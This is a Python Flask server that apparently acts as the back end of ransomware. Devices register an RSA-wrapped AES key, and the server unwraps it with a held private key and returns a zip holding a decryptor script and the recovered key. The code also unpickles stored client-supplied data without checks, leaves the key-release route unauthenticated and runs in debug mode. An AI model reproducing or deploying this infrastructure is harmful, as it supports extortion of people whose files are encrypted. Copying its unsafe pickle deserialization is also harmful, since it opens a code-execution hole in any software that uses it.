import base64
import codecs
import json
import os
import pickle
from zipfile import ZipFile

import Crypto.Random.random
import flask
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.PublicKey import RSA
from flask import Flask, request, jsonify, send_from_directory
from flask_migrate import Migrate
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = "./"
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 16MB
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///database.db"

db.init_app(app)
migrate = Migrate(app, db)


class Device(db.Model):
    uid = db.Column(db.Text, primary_key=True)
    key = db.Column(db.Text, unique=True, nullable=False)

    def __init__(self, uid, key):
        self.uid = uid
        self.key = key


@app.route('/add', methods=['POST'])
def add():
    device = Device(request.json['uid'], request.json['key'])
    db.session.add(device)
    db.session.commit()
    return jsonify({
        'status': 'ok'
    })


@app.route('/get', methods=['POST'])
def get():
    # TODO: Add Check
    query = Device.query.filter_by(uid=request.form['uid']).first()

    if query is None: return 'error'

    data = pickle.loads(codecs.decode(query.key.encode('utf-8'), "base64"))
    private_key = RSA.import_key(open("priv.pem",'r').read())
    enc_session_key, nonce, tag, ciphertext = data
    cipher_rsa = PKCS1_OAEP.new(private_key)
    session_key = cipher_rsa.decrypt(enc_session_key)
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
    key = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open('key.json','w+') as f:
        json.dump({
            'key': base64.b64encode(key).decode('utf-8')
        }, f)

    with ZipFile('decryptor.zip', 'w') as zipObj:
        zipObj.write('decryptor.py')
        zipObj.write('key.json')  # Priv

    os.remove('key.json')
    return flask.send_file(
        'decryptor.zip',
        mimetype='application/zip',
        as_attachment=True,
        attachment_filename='decryptor.zip'
    )


@app.route('/')
def index():
    return send_from_directory('.', 'index.html')


if __name__ == "__main__":
    app.run(debug=True)
